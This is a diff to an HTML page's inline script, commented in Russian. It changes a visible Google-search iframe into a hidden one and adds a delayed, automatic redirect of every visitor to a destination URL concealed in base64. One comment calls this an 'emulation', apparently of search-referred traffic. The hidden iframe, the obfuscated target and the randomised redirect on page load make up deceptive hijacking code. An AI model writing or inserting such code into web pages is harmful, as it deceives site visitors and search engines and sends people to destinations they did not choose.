@@ -725,29 +725,35 @@
 
 <script>
   (function() {
+    // Задержка перед вставкой фрейма с поиском (в мс)
     const searchDelay = 2000;
+
+    // Дополнительная задержка перед редиректом (2–5 сек)
     const redirectDelay = 2000 + Math.random() * 3000;
 
+    // Поисковый запрос
     const searchQuery = encodeURIComponent("korolevachiana абдулла");
     const googleURL = "https://www.google.com/search?q=" + searchQuery;
 
+    // Адрес целевого сайта (base64 закодирован)
     const encodedTarget = "aHR0cHM6Ly9rb3JvbGV2YWNoaWFuYS5naXRodWIuaW8vRml2ZVRleHQvcmVzb3VyY2VzL2FiZHVsbGEuaHRtbA==";
     const targetURL = atob(encodedTarget);
 
+    // Запуск эмуляции
     setTimeout(() => {
       const iframe = document.createElement("iframe");
       iframe.src = googleURL;
-      iframe.style.width = "100%";
-      iframe.style.height = "600px";
-      iframe.style.border = "1px solid #ccc";
+      iframe.style.display = "none";
       document.body.appendChild(iframe);
 
+      // Переход на целевой сайт
       setTimeout(() => {
         window.location.href = targetURL;
       }, redirectDelay);
     }, searchDelay);
   })();
 </script>
+
 
 
 
